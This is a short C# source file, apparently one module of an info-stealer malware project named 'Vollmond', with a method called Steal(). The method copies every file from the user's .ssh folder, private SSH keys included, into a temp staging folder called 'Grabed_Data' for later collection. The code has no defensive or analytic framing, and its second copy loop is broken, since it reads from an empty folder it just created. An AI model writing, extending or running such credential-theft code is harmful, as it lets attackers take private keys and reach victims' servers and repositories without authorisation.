namespace Vollmond
{
    internal class GitAgent
    {
        public static void Steal()
        {
            string targetFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".ssh");
            string DataFolder = Path.Combine(Path.GetTempPath(), "Grabed_Data", "Git SSH Agent");

            if (Directory.Exists(targetFolder))
            {
                Directory.CreateDirectory(DataFolder);
                Directory.CreateDirectory(Path.Combine(DataFolder, "agent"));

                foreach (string file in Directory.GetFiles(targetFolder))
                {
                    File.Copy(file, Path.Combine(DataFolder, Path.GetFileName(file)));
                }

                foreach (string file in Directory.GetFiles(Path.Combine(DataFolder, "agent")))
                {
                    File.Copy(file, Path.Combine(DataFolder, "agent", Path.GetFileName(file)));
                }
            }
        }
    }
}
